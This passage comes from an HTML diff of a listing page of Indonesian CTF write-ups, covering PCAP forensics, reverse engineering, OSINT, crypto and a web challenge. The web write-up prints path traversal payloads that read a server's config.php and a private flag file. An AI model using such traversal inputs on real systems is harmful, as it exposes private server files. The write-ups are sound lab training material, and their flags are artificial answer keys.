+      <i class="icon fa-solid fa-clock-rotate-left"></i>
+      <span>June 12, 2026</span>
+    </span>
+  
+</div>
+
+
+  
+
+
+  <div class="tags">
+    
+      <a href="/writeups?search=%22tag:%20forensics%22" class="tag" data-tooltip='Show items with the tag "forensics"'>
+        forensics
+      </a>
+    
+      <a href="/writeups?search=%22tag:%20zero-day-2026%22" class="tag" data-tooltip='Show items with the tag "zero-day-2026"'>
+        zero-day-2026
+      </a>
+    
+  </div>
+
+
+
+
+
+      
+      
+      
+      
+      <p data-search="Detail Soal Field Value Nama Challenge W1-E2: Lalu Lintas Jaringan Kategori Digital Forensics Event ZERO DAY Mini Games 2026 File traffic.pcap Deskripsi SingkatPada challenge W1-E2: Lalu Lintas Jaringan, diberikan sebuah file capture bernama traffic.pcap. File ini berisi rekaman lalu lintas jaringan dari workstation yang dicurigai melakukan komunikasi tidak sah dengan server eksternal. Tujuan dari challenge ini adalah menganalisis traffic tersebut dan menemukan data tersembunyi yang mengarah ke flag.Analisis AwalLangkah pertama yang saya lakukan adalah membuka file traffic.pcap menggunakan Wireshark. Dari hasil pengamatan awal, terlihat bahwa traffic berisi beberapa komunikasi HTTP biasa, seperti akses ke website umum, request status API, request ping internal, dan komunikasi ke beberapa endpoint.Untuk mempercepat analisis, saya juga menggunakan perintah strings agar dapat melihat teks yang terbaca langsung dari file PCAP.strings traffic.pcapDari hasil tersebut terlihat beberapa request HTTP, salah satunya menuju host berikut:backend.siluman-tech.idHost ini terlihat mencurigakan karena terdapat beberapa endpoint yang tidak umum, seperti: api submit session refresh api c2 beacon update checkSelain itu, ditemukan juga beberapa data yang terlihat seperti Base64.Langkah PenyelesaianPada awalnya ditemukan request berikut:POST api submit HTTP 1.1Host: backend.siluman-tech.iduser id EMP3391 amp;action check in amp;secret token c2VjcmV0XzRiOGYyYzlkMWE2ZTNmN2IwYzVkMmU4YTlmNGIxYzdlNilai secret token tersebut terlihat seperti Base64, sehingga saya mencoba melakukan decode.echo c2VjcmV0XzRiOGYyYzlkMWE2ZTNmN2IwYzVkMmU4YTlmNGIxYzdl base64 -dHasilnya:secret 4b8f2c9d1a6e3f7b0c5d2e8a9f4b1c7eNamun hasil tersebut bukan flag, melainkan hanya token atau petunjuk lain. Karena challenge menyebutkan adanya data yang disembunyikan dalam lalu lintas normal, saya melanjutkan analisis ke request lain yang terlihat lebih mencurigakan.Kemudian ditemukan komunikasi berikut:POST api c2 beacon HTTP 1.1Host: backend.siluman-tech.idContent-Type: application jsonX-Client-ID: SLM-EMP3391 host : WS-3391 , os : win10 , ts :1748000000 Endpoint api c2 beacon cukup mencurigakan karena istilah C2 biasanya merujuk pada Command and Control, yaitu komunikasi antara client yang terinfeksi dengan server pengendali.Response dari server berisi data berikut:HTTP 1.1 200 OKContent-Type: application jsonX-Request-ID: c2-20260528-9f3a status : ok , task : idle , ref : ZmxhZ3twY2FwX2MyX3IzZl9iNHMzNjRfM3hmMWx9 Pada bagian response terdapat field ref yang berisi string Base64:ZmxhZ3twY2FwX2MyX3IzZl9iNHMzNjRfM3hmMWx9String tersebut kemudian saya decode menggunakan perintah:echo ZmxhZ3twY2FwX2MyX3IzZl9iNHMzNjRfM3hmMWx9 base64 -dHasil decode-nya adalah:flag pcap c2 r3f b4s364 3xf1l Dari sini dapat disimpulkan bahwa flag disembunyikan pada response komunikasi C2 dalam field ref, lalu diencoding menggunakan Base64.Flagflag pcap c2 r3f b4s364 3xf1l Kesimpulan Hal yang DipelajariPada challenge ini, flag tidak muncul secara langsung di tampilan traffic biasa. Data penting disamarkan dalam komunikasi HTTP yang terlihat normal, tepatnya pada response endpoint api c2 beacon. Dari challenge ini dipelajari bahwa dalam analisis PCAP, kita tidak hanya perlu melihat request yang terlihat mencurigakan, tetapi juga perlu memeriksa response server, parameter tersembunyi, header, serta data yang tampak seperti hasil encoding. Base64 sering digunakan untuk menyamarkan data agar tidak langsung terbaca.">
+        Pada challenge W1-E2: Lalu Lintas Jaringan, diberikan sebuah file capture bernama traffic.pcap. File ini berisi rekaman lalu lintas jaringan dari workstation yang dicurigai melakukan komunikasi tidak sah dengan server eksternal. Tujuan dari challenge ini adalah menganalisis traffic tersebut dan menemukan...
+      </p>
+    </div>
+  </div>
+</div>
+
+<div class="post-excerpt-container">
+  <div class="post-excerpt">
+    
+    
+    
+
+    
+    <a href="/2026/06/10/manajer-berkas-internal.html" class="post-excerpt-image" aria-label="W1-C2 Manajer Berkas Internal">
+      <img src="/images/oxucl-logo.jpg" alt="W1-C2 Manajer Berkas Internal" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+    </a>
+    
+
+    <div class="post-excerpt-text">
+      <a href="/2026/06/10/manajer-berkas-internal.html">W1-C2 Manajer Berkas Internal</a>
+
+      <div class="post-info">
+  
+    
+    
+      
+      
+        
+
+
+
+<div class="portrait-wrapper">
+  <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
+    
+
+    <img src="/images/default-avatar.svg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+
+    
+      <span class="portrait-name">
+        Azizul Manal Gaumalanga
+      </span>
+    
+
+    
+
+    
+      <span class="portrait-affiliation">
+        Teknik Informatika (2024)
+      </span>
+    
+  </a>
+</div>
+
+      
+    
+  
+
+  
+  
+
+  
+    <span data-tooltip="Originally published on">
+      <i class="icon fa-regular fa-calendar"></i>
+      <span>June 10, 2026</span>
+    </span>
+  
+
+  
+    <span data-tooltip="Last updated on">
+      <i class="icon fa-solid fa-clock-rotate-left"></i>
+      <span>June 12, 2026</span>
+    </span>
+  
+</div>
+
+
+  
+
+
+  <div class="tags">
+    
+      <a href="/writeups?search=%22tag:%20web%22" class="tag" data-tooltip='Show items with the tag "web"'>
+        web
+      </a>
+    
+      <a href="/writeups?search=%22tag:%20zero-day-2026%22" class="tag" data-tooltip='Show items with the tag "zero-day-2026"'>
+        zero-day-2026
+      </a>
+    
+  </div>
+
+
+
+
+
+      
+      
+      
+      
+      <p data-search="Detail Soal Field Value Nama Challenge W1-C2: Manajer Berkas Internal Kategori Web Breach Event ZERO DAY Mini Games 2026 Poin 100 Difficulty Beginner Target Website Manajer Berkas Internal PT Cahaya Nusantara Deskripsi SingkatPada challenge ini diberikan sebuah website manajemen berkas internal milik PT Cahaya Nusantara. Website tersebut digunakan untuk menampilkan beberapa dokumen internal seperti halaman beranda, dokumen, laporan, dan panduan.Dari narasi soal dijelaskan bahwa sistem menggunakan parameter URL untuk menentukan berkas yang ditampilkan. Catatan soal juga memberikan petunjuk bahwa validasi yang tidak sempurna dapat membuka akses ke seluruh sistem. Berdasarkan petunjuk tersebut, kemungkinan besar terdapat celah pada proses pembacaan file melalui parameter URL.Analisis AwalSaat membuka halaman utama, terlihat bahwa website menampilkan isi file welcome.txt. Pada menu navigasi, setiap halaman dipanggil menggunakan parameter page, contohnya: page welcome.txt page dokumen.txt page laporan.txt page panduan.txtHal ini menunjukkan bahwa aplikasi membaca file berdasarkan nilai dari parameter page.Kemudian saya memeriksa source code halaman dan menemukan komentar HTML berikut: lt; -- Konfigurasi: lihat var www html config.php untuk referensi path flag file -- gt;Komentar tersebut menjadi petunjuk penting karena memberitahu bahwa file konfigurasi berada di: var www html config.phpSelain itu, file tersebut juga disebut berisi referensi menuju lokasi file flag.Langkah PenyelesaianLangkah pertama adalah mencoba membaca file config.php menggunakan teknik path traversal melalui parameter page.Payload yang digunakan: page .. .. .. .. var www html config.phpSetelah payload tersebut dijalankan melalui browser, isi file config.php berhasil ditampilkan. Di dalam file tersebut ditemukan konfigurasi berikut: lt; php config.php - Konfigurasi Sistem Manajer Berkas Internal File ini berisi konfigurasi path dan pengaturan aplikasi. Path ke direktori halamandefine PAGES DIR , var www html pages ; Path token autentikasi sistem flag file var www private flag.txt ; Pengaturan tampilandefine APP NAME , Manajer Berkas Internal ;define APP VERSION , 1.4.2 ;define COMPANY , PT Cahaya Nusantara ;Dari file konfigurasi tersebut, diketahui bahwa lokasi flag berada di: var www private flag.txtSetelah mengetahui lokasi flag, saya kembali menggunakan parameter page untuk membaca file tersebut: page .. .. .. .. var www private flag.txtPayload tersebut berhasil menampilkan isi file flag pada halaman website. Setelah flag didapatkan, flag kemudian disubmit ke platform dan berhasil diterima.FlagDSG ... Kesimpulan Hal yang DipelajariChallenge ini memanfaatkan kerentanan Local File Inclusion atau Path Traversal. Kerentanan terjadi karena aplikasi menerima input dari parameter page untuk menentukan file yang akan dibaca, tetapi tidak membatasi akses hanya ke direktori file yang seharusnya.Akibatnya, pengguna dapat menggunakan pola .. untuk keluar dari direktori halaman dan membaca file lain di server, termasuk file konfigurasi dan file flag. Dari challenge ini dapat dipelajari bahwa validasi path sangat penting pada fitur pembacaan file. Aplikasi seharusnya menggunakan whitelist file yang boleh diakses, membatasi direktori kerja, serta mencegah penggunaan traversal sequence seperti .. .">
+        Pada challenge ini diberikan sebuah website manajemen berkas internal milik PT Cahaya Nusantara. Website tersebut digunakan untuk menampilkan beberapa dokumen internal seperti halaman beranda, dokumen, laporan, dan panduan. Dari narasi soal dijelaskan bahwa sistem menggunakan parameter URL untuk menentukan berkas...
+      </p>
+    </div>
+  </div>
+</div>
+
+<div class="post-excerpt-container">
+  <div class="post-excerpt">
+    
+    
+    
+
+    
+    <a href="/2026/06/10/pemeriksa-kredensial.html" class="post-excerpt-image" aria-label="W1-D3 Pemeriksa Kredensial">
+      <img src="/images/oxucl-logo.jpg" alt="W1-D3 Pemeriksa Kredensial" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+    </a>
+    
+
+    <div class="post-excerpt-text">
+      <a href="/2026/06/10/pemeriksa-kredensial.html">W1-D3 Pemeriksa Kredensial</a>
+
+      <div class="post-info">
+  
+    
+    
+      
+      
+        
+
+
+
+<div class="portrait-wrapper">
+  <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
+    
+
+    <img src="/images/default-avatar.svg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+
+    
+      <span class="portrait-name">
+        Azizul Manal Gaumalanga
+      </span>
+    
+
+    
+
+    
+      <span class="portrait-affiliation">
+        Teknik Informatika (2024)
+      </span>
+    
+  </a>
+</div>
+
+      
+    
+  
+
+  
+  
+
+  
+    <span data-tooltip="Originally published on">
+      <i class="icon fa-regular fa-calendar"></i>
+      <span>June 10, 2026</span>
+    </span>
+  
+
+  
+    <span data-tooltip="Last updated on">
+      <i class="icon fa-solid fa-clock-rotate-left"></i>
+      <span>June 12, 2026</span>
+    </span>
+  
+</div>
+
+
+  
+
+
+  <div class="tags">
+    
+      <a href="/writeups?search=%22tag:%20rev%22" class="tag" data-tooltip='Show items with the tag "rev"'>
+        rev
+      </a>
+    
+      <a href="/writeups?search=%22tag:%20binary%22" class="tag" data-tooltip='Show items with the tag "binary"'>
+        binary
+      </a>
+    
+      <a href="/writeups?search=%22tag:%20zero-day-2026%22" class="tag" data-tooltip='Show items with the tag "zero-day-2026"'>
+        zero-day-2026
+      </a>
+    
+  </div>
+
+
+
+
+
+      
+      
+      
+      
+      <p data-search="Detail Soal Field Value Nama Challenge W1-D3: Pemeriksa Kredensial Kategori Reverse Binary Event ZERO DAY Mini Games 2026 File pemeriksa kredensial Deskripsi SingkatPada challenge W1-D3: Pemeriksa Kredensial, diberikan sebuah binary bernama pemeriksa kredensial. Binary ini meminta input kredensial, lalu menentukan apakah input tersebut benar atau salah. Tujuan dari challenge ini adalah melakukan analisis reverse engineering untuk mengetahui kredensial yang valid.Analisis AwalPertama, saya menjalankan pengecekan awal terhadap binary menggunakan perintah file.file pemeriksa kredensialHasilnya menunjukkan bahwa file merupakan binary ELF 64-bit untuk Linux dan tidak ter-strip, sehingga nama fungsi masih dapat terlihat saat dianalisis.Selanjutnya, saya menggunakan strings untuk melihat string yang tersimpan di dalam binary.strings pemeriksa kredensialDari hasil tersebut ditemukan beberapa string menarik seperti:ADMIN-CREDENTIAL-2026ROOT-ACCESS-TOKENfWQza2M0cmNfbjE0aGNfNDYzczRiXzNzcjN2M3J7Z2FsZg Dua string pertama terlihat seperti kredensial, tetapi kemungkinan hanya decoy atau pengalih perhatian. String ketiga terlihat seperti Base64 karena memiliki pola karakter Base64 dan diakhiri dengan tanda .Langkah PenyelesaianBinary kemudian dianalisis lebih lanjut menggunakan objdump.objdump -d -Mintel pemeriksa kredensialDari fungsi main, ditemukan bahwa program melakukan beberapa proses terhadap input pengguna. Alurnya adalah: Program menerima input dari user. Karakter newline dihapus. Input dibalik menggunakan fungsi reverse str. Hasil reverse kemudian di-encode menggunakan fungsi b64 encode. Hasil encoding dibandingkan dengan string Base64 yang tersimpan di binary.String pembanding yang ditemukan adalah:fWQza2M0cmNfbjE0aGNfNDYzczRiXzNzcjN2M3J7Z2FsZg Karena program melakukan proses:input reverse base64 encode comparemaka untuk mendapatkan input asli, urutan tersebut harus dibalik:base64 decode reverseSaya menggunakan Python untuk melakukan decoding.python3 -c import base64; s fWQza2M0cmNfbjE0aGNfNDYzczRiXzNzcjN2M3J7Z2FsZg ; print base64.b64decode s .decode Hasil decode Base64: d3kc4rc n14hc 463s4b 3sr3v3r galfHasil tersebut masih dalam kondisi terbalik, sehingga perlu dibalik lagi.python3 -c import base64; s fWQza2M0cmNfbjE0aGNfNDYzczRiXzNzcjN2M3J7Z2FsZg ; print base64.b64decode s .decode ::-1 Hasil akhirnya adalah:flag r3v3rs3 b4s364 ch41n cr4ck3d Setelah input tersebut dimasukkan ke program, binary menampilkan pesan bahwa kredensial benar dan akses diberikan.printf flag r3v3rs3 b4s364 ch41n cr4ck3d n . pemeriksa kredensialOutput:Kredensial benar Akses diberikan.Flagflag r3v3rs3 b4s364 ch41n cr4ck3d Kesimpulan Hal yang DipelajariPada challenge ini, flag tidak langsung tersimpan dalam bentuk plaintext. Binary melakukan beberapa lapisan transformasi, yaitu membalik input lalu melakukan encoding Base64 sebelum membandingkannya dengan nilai yang sudah disimpan. Dari challenge ini dipelajari bahwa saat melakukan reverse engineering, penting untuk memahami urutan transformasi yang dilakukan program. Untuk mendapatkan nilai asli, proses tersebut harus dibalik dengan urutan yang berlawanan.">
+        Pada challenge W1-D3: Pemeriksa Kredensial, diberikan sebuah binary bernama pemeriksa_kredensial. Binary ini meminta input kredensial, lalu menentukan apakah input tersebut benar atau salah. Tujuan dari challenge ini adalah melakukan analisis reverse engineering untuk mengetahui kredensial yang valid. Analisis Awal Pertama,...
+      </p>
+    </div>
+  </div>
+</div>
+
+<div class="post-excerpt-container">
+  <div class="post-excerpt">
+    
+    
+    
+
+    
+    <a href="/2026/06/10/perangkat-lunak-terkunci.html" class="post-excerpt-image" aria-label="W1-D2 Perangkat Lunak Terkunci">
+      <img src="/images/oxucl-logo.jpg" alt="W1-D2 Perangkat Lunak Terkunci" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+    </a>
+    
+
+    <div class="post-excerpt-text">
+      <a href="/2026/06/10/perangkat-lunak-terkunci.html">W1-D2 Perangkat Lunak Terkunci</a>
+
+      <div class="post-info">
+  
+    
+    
+      
+      
+        
+
+
+
+<div class="portrait-wrapper">
+  <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
+    
+
+    <img src="/images/default-avatar.svg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+
+    
+      <span class="portrait-name">
+        Azizul Manal Gaumalanga
+      </span>
+    
+
+    
+
+    
+      <span class="portrait-affiliation">
+        Teknik Informatika (2024)
+      </span>
+    
+  </a>
+</div>
+
+      
+    
+  
+
+  
+  
+
+  
+    <span data-tooltip="Originally published on">
+      <i class="icon fa-regular fa-calendar"></i>
+      <span>June 10, 2026</span>
+    </span>
+  
+
+  
+    <span data-tooltip="Last updated on">
+      <i class="icon fa-solid fa-clock-rotate-left"></i>
+      <span>June 12, 2026</span>
+    </span>
+  
+</div>
+
+
+  
+
+
+  <div class="tags">
+    
+      <a href="/writeups?search=%22tag:%20rev%22" class="tag" data-tooltip='Show items with the tag "rev"'>
+        rev
+      </a>
+    
+      <a href="/writeups?search=%22tag:%20binary%22" class="tag" data-tooltip='Show items with the tag "binary"'>
+        binary
+      </a>
+    
+      <a href="/writeups?search=%22tag:%20zero-day-2026%22" class="tag" data-tooltip='Show items with the tag "zero-day-2026"'>
+        zero-day-2026
+      </a>
+    
+  </div>
+
+
+
+
+
+      
+      
+      
+      
+      <p data-search="Detail Soal Field Value Nama Challenge W1-D2: Perangkat Lunak Terkunci Kategori Reverse Binary Event ZERO DAY Mini Games 2026 Poin 100 Difficulty Beginner File perangkat lunak terkunci Deskripsi SingkatPada challenge ini diberikan sebuah binary bernama perangkat lunak terkunci. Binary tersebut merupakan program verifikasi lisensi yang meminta input berupa kunci lisensi. Tujuan dari challenge ini adalah menganalisis cara program memvalidasi input, lalu menemukan license key yang benar agar program berhasil diaktifkan.Analisis AwalPertama, binary dijalankan untuk melihat perilakunya.. perangkat lunak terkunciProgram meminta input lisensi. Jika input salah, program akan menampilkan pesan bahwa lisensi tidak valid. Berdasarkan catatan soal, nilai yang tersimpan di dalam binary kemungkinan tidak disimpan dalam bentuk asli, sehingga perlu dianalisis menggunakan teknik reverse engineering sederhana.Selanjutnya dilakukan pengecekan string yang ada di dalam binary.strings perangkat lunak terkunciDari hasil pengecekan ditemukan sebuah string panjang berbentuk hexadecimal:666c61677b6833785f737472316e675f6c3163336e73335f637234636b33647dString tersebut terlihat seperti data yang sudah di-encode, bukan teks biasa.Langkah PenyelesaianKarena string yang ditemukan berbentuk hexadecimal, langkah berikutnya adalah melakukan decode dari hex ke ASCII.Decode dapat dilakukan menggunakan command berikut:echo 666c61677b6833785f737472316e675f6c3163336e73335f637234636b33647d xxd -r -pHasil decode-nya adalah:flag h3x str1ng l1c3ns3 cr4ck3d Setelah itu, hasil decode tersebut dicoba sebagai input lisensi ke program.. perangkat lunak terkunciKemudian masukkan:flag h3x str1ng l1c3ns3 cr4ck3d Program memberikan output bahwa lisensi valid dan perangkat lunak berhasil diaktifkan. Ini membuktikan bahwa string hexadecimal di dalam binary adalah license key yang benar setelah didecode.Flagflag h3x str1ng l1c3ns3 cr4ck3d Kesimpulan Hal yang DipelajariPada challenge ini, validasi lisensi dilakukan dengan membandingkan input pengguna dengan nilai yang sudah disimpan di dalam binary dalam bentuk hexadecimal. Dari challenge ini dapat dipelajari bahwa pada reverse engineering, string penting seperti password, key, atau flag tidak selalu disimpan dalam bentuk plaintext, tetapi bisa disamarkan menggunakan encoding sederhana seperti hex.">
+        Pada challenge ini diberikan sebuah binary bernama perangkat_lunak_terkunci. Binary tersebut merupakan program verifikasi lisensi yang meminta input berupa kunci lisensi. Tujuan dari challenge ini adalah menganalisis cara program memvalidasi input, lalu menemukan license key yang benar agar program berhasil diaktifkan....
+      </p>
+    </div>
+  </div>
+</div>
+
+<div class="post-excerpt-container">
+  <div class="post-excerpt">
+    
+    
+    
+
+    
+    <a href="/2026/06/10/perusahaan-bayangan.html" class="post-excerpt-image" aria-label="W1-B3 Perusahaan Bayangan">
+      <img src="/images/oxucl-logo.jpg" alt="W1-B3 Perusahaan Bayangan" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+    </a>
+    
+
+    <div class="post-excerpt-text">
+      <a href="/2026/06/10/perusahaan-bayangan.html">W1-B3 Perusahaan Bayangan</a>
+
+      <div class="post-info">
+  
+    
+    
+      
+      
+        
+
+
+
+<div class="portrait-wrapper">
+  <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
+    
+
+    <img src="/images/default-avatar.svg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+
+    
+      <span class="portrait-name">
+        Azizul Manal Gaumalanga
+      </span>
+    
+
+    
+
+    
+      <span class="portrait-affiliation">
+        Teknik Informatika (2024)
+      </span>
+    
+  </a>
+</div>
+
+      
+    
+  
+
+  
+  
+
+  
+    <span data-tooltip="Originally published on">
+      <i class="icon fa-regular fa-calendar"></i>
+      <span>June 10, 2026</span>
+    </span>
+  
+
+  
+    <span data-tooltip="Last updated on">
+      <i class="icon fa-solid fa-clock-rotate-left"></i>
+      <span>June 12, 2026</span>
+    </span>
+  
+</div>
+
+
+  
+
+
+  <div class="tags">
+    
+      <a href="/writeups?search=%22tag:%20osint%22" class="tag" data-tooltip='Show items with the tag "osint"'>
+        osint
+      </a>
+    
+      <a href="/writeups?search=%22tag:%20recon%22" class="tag" data-tooltip='Show items with the tag "recon"'>
+        recon
+      </a>
+    
+      <a href="/writeups?search=%22tag:%20zero-day-2026%22" class="tag" data-tooltip='Show items with the tag "zero-day-2026"'>
+        zero-day-2026
+      </a>
+    
+  </div>
+
+
+
+
+
+      
+      
+      
+      
+      <p data-search="Detail Soal Field Value - - Detail Soal Nama Challenge W1-B3: Perusahaan Bayangan Kategori Recon OSINT Poin 200 Event ZERO DAY Mini Games 2026 Deskripsi SingkatPada challenge ini, diberikan sebuah website milik PT Siluman Teknologi. Berdasarkan narasi soal, data sensitif perusahaan diduga bocor dan tersebar di beberapa lokasi digital. Tujuan dari challenge ini adalah menelusuri jejak-jejak yang tersedia pada website untuk menemukan komponen yang diperlukan dalam proses mendapatkan flag.Analisis AwalLangkah pertama dilakukan dengan membuka halaman utama PT Siluman Teknologi. Pada halaman tersebut terdapat daftar tim teknis unggulan dan sebuah tautan untuk mengunduh direktori karyawan dalam bentuk file employee list.csv.Dari file CSV tersebut ditemukan beberapa data karyawan seperti nama, divisi, email, status, dan blog pribadi. Salah satu entri yang menarik adalah Ahmad Fauzi, seorang Senior Security Engineer dengan ID karyawan EMP-3391, yang memiliki blog pribadi bernama aftech.html.Selain itu, pengecekan terhadap robots.txt juga memberikan petunjuk penting karena terdapat beberapa path yang tidak diperbolehkan untuk diindeks, salah satunya adalah leaked env.txt. File ini menjadi petunjuk kuat karena halaman utama juga menyebutkan adanya potensi kebocoran file konfigurasi.Langkah PenyelesaianPertama, saya membuka file employee list.csv dari halaman utama. File tersebut berisi data karyawan PT Siluman Teknologi. Dari file ini ditemukan bahwa Ahmad Fauzi memiliki blog pribadi dengan path:aftech.htmlSetelah membuka halaman aftech.html, terdapat petunjuk bahwa file gambar sering menyimpan informasi lebih dari yang terlihat, khususnya melalui metadata. Pada halaman tersebut juga terdapat gambar profil Ahmad Fauzi dengan nama file:profile ahmad.jpgSelanjutnya, saya membuka file robots.txt dan menemukan beberapa path tersembunyi: internal admin leaked env.txtPath yang paling relevan adalah leaked env.txt karena berhubungan dengan kebocoran konfigurasi. Setelah dibuka, file tersebut berisi konfigurasi API dan sebuah token terenkripsi:API TOKEN ENC VV9YViMEQmkCbEEGKUcuKFxBZlprTi5kQEAKXDpbQjRODari petunjuk pada blog Ahmad Fauzi, saya kemudian memeriksa metadata gambar profile ahmad.jpg. Pada metadata gambar ditemukan komentar:kunci2: X7qPKarena Ahmad Fauzi memiliki ID karyawan EMP-3391, maka bagian pertama kunci diambil dari ID tersebut, yaitu:3391Kemudian kunci kedua dari metadata adalah:X7qPSehingga kunci lengkap yang digunakan adalah:3391X7qPToken API TOKEN ENC kemudian didecode dari Base64, lalu hasilnya didekripsi menggunakan XOR dengan kunci 3391X7qP. Dari proses tersebut didapatkan flag:flag 3391 x7qp xor k3y 4ss3mbl3d Flagflag 3391 x7qp xor k3y 4ss3mbl3d Kesimpulan Hal yang DipelajariChallenge ini mengajarkan bahwa dalam OSINT, informasi penting tidak selalu terlihat langsung pada halaman utama. Petunjuk dapat tersebar di berbagai tempat seperti file CSV, robots.txt, file konfigurasi yang bocor, halaman blog pribadi, hingga metadata gambar. Selain itu, challenge ini juga menunjukkan pentingnya menggabungkan beberapa potongan informasi untuk mendapatkan kunci dekripsi yang benar.">
+        Pada challenge ini, diberikan sebuah website milik PT Siluman Teknologi. Berdasarkan narasi soal, data sensitif perusahaan diduga bocor dan tersebar di beberapa lokasi digital. Tujuan dari challenge ini adalah menelusuri jejak-jejak yang tersedia pada website untuk menemukan komponen yang diperlukan...
+      </p>
+    </div>
+  </div>
+</div>
+
+<div class="post-excerpt-container">
+  <div class="post-excerpt">
+    
+    
+    
+
+    
+    <a href="/2026/06/10/pesan-tersembunyi.html" class="post-excerpt-image" aria-label="W1-A1 Pesan Tersembunyi">
+      <img src="/images/oxucl-logo.jpg" alt="W1-A1 Pesan Tersembunyi" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+    </a>
+    
+
+    <div class="post-excerpt-text">
+      <a href="/2026/06/10/pesan-tersembunyi.html">W1-A1 Pesan Tersembunyi</a>
+
+      <div class="post-info">
+  
+    
+    
+      
+      
+        
+
+
+
+<div class="portrait-wrapper">
+  <a href="/members/azizul-manal-gaumalanga.html" class="portrait" data-style="tiny" aria-label="Azizul Manal Gaumalanga">
+    
+
+    <img src="/images/default-avatar.svg" class="portrait-image" alt="member portrait" loading="lazy" onerror="this.src = '/images/fallback.svg'; this.onerror = null;">
+
+    
+      <span class="portrait-name">
+        Azizul Manal Gaumalanga
+      </span>
+    
+
+    
+
+    
+      <span class="portrait-affiliation">
+        Teknik Informatika (2024)
+      </span>
+    
+  </a>
+</div>
+
+      
+    
+  
+
+  
+  
+
+  
+    <span data-tooltip="Originally published on">
+      <i class="icon fa-regular fa-calendar"></i>
+      <span>June 10, 2026</span>
+    </span>
+  
+
+  
+    <span data-tooltip="Last updated on">
+      <i class="icon fa-solid fa-clock-rotate-left"></i>
+      <span>June 12, 2026</span>
+    </span>
+  
+</div>
+
+
+  
+
+
+  <div class="tags">
+    
+      <a href="/writeups?search=%22tag:%20crypto%22" class="tag" data-tooltip='Show items with the tag "crypto"'>
+        crypto
+      </a>
+    
+      <a href="/writeups?search=%22tag:%20puzzle%22" class="tag" data-tooltip='Show items with the tag "puzzle"'>
+        puzzle
+      </a>
+    
+      <a href="/writeups?search=%22tag:%20zero-day-2026%22" class="tag" data-tooltip='Show items with the tag "zero-day-2026"'>
+        zero-day-2026
+      </a>
+    
+  </div>
+
+
+
+
+
+      
+      
+      
+      
+      <p data-search="Detail Soal Field Value Nama Challenge W1-A1 Pesan Tersembunyi Kategori Crypto amp; Puzzle Event ZERO DAY Mini Games 2026 Poin 100 Difficulty Easy File ANALYST NOTE.txt ENCODE MEMO.txt SERVER LOG.txt Deskripsi SingkatChallange ini termasuk ke dalam kategori crypto dan puzzle, berdasarkan instruksi yang diberikan, peserta diminta untuk membuka file yang disediakan dan membaca isinya. Catatan pada soal memberikan petunjuk bahwa data mengandung pola. Data yang tampak acak selalu menyimpan pola - tugas analis adalah menemukannya. Analisis AwalPada challenge ini terdapat tiga file yang diberikan, yaitu ANALYST NOTE.txt, ENCODE MEMO.txt, dan SERVER LOG.txt.Langkah pertama yang saya lakukan adalah membaca dan menganalisis masing-masing file untuk mencari petunjuk awal, hal ini sesuai dengan catatan pada challenge.File ANALYST NOTE.txt berfungsi sebagai petunjuk utama. Dari catatan tersebut, saya memahami bahwa data yang dicari telah disamarkan dengan menggunakan dua lapisan encoding, dan target utama pemeriksaan adalah file ENCODE MEMO.txt.File ENCODE MEMO.txt berisi:WlJaQiBWQUdSRUFOWSDigJQgRU5VTkZWTgpYcmNucW4gIDogR3Z6IFpuYW53cnpyYSBDRyBBaGZuYWduZW4gUXZ0dmdueQpRbmV2ICAgIDogUXJjbmVncnpyYSBYcm56bmFuYSBWYXNiZXpuZnYKQ3JldnVueSA6IFZhZnZxcmEgWHJvYnBiZW5hIFFuZ24g4oCUIEd2YXFueCBZbmF3aGcgRnJ0cmVuCgpDbnFuIGduYXR0bnkgMTUgWnJ2IDIwMjYsIGZ2ZmdyeiB4bnp2IHpyYXFyZ3J4ZnYgbnhndml2Z25mIGd2cW54IGZudSBsbmF0CnpyYXRueHZvbmd4bmEgeHJvYnBiZW5hIHFuZ24gcW5ldiBmcmVpcmUgY2VicWh4ZnYuIENyeW54aCBxdnFodG4genJhdHRoYW54bmEKbnluZyBiZ2J6bmd2ZiBoYWdoeCB6cmF0cnhmZ2VueCBxbmduIHhiYXN2dGhlbmZ2IGZyYWZ2Z3ZzIHFuZXYgcXZlcnhnYmV2IGxuYXQKZnJ1bmVoZmFsbiBxdm9uZ25mdiBueGZyZmFsbi4KCk9yZXFuZm5leG5hIG5hbnl2ZnZmIHlidCBuam55LCBxdmdyemh4bmEgb251am4gZnJ3aHp5bnUgc3Z5ciB4YmFzdnRoZW5mdiBncnludQpxdnJ4ZnN2eWdlbmZ2LiBDcnlueGggcXZjcmV4dmVueG5hIGdyeW51IHpyYWxuem5leG5hIHFuZ24gZ3JlZnJvaGcgenJhdHRoYW54bmEKZ3J4YXZ4IHJhcGJxdmF0IGZyb3J5aHogenJhdHZldnp4bmFhbG4geHIgZnJlaXJlIHJ4ZmdyZWFueS4gVmFpcmZndnRuZnYgeXJvdnUKeW5hd2hnIHpuZnZ1IG9yZXluYXRmaGF0IG9yZWZuem4gZ3Z6IFBGVkVHLgoKWGJxciBxbmVoZW5nIGxuYXQgcXZncmduY3huYTogc3ludHtxMGhveTNfeTRsM2VfejN6MF9xM3AwcTNxfS4gWGJxciB2YXYgdW5hbG4gcXZjcmVoYWdoeHhuYSBvbnR2Cmd2eiB2YWZ2cXJhIHFuYSB1bmVoZiBxdndudG4geHJlbnVuZnZubmFhbG4uIFduYXRuYSBxdmZyb25leG5hIHpyeW55aHYgeG5hbnkKeGJ6aGF2eG5mdiBsbmF0IGd2cW54IG56bmEgZ25hY24gc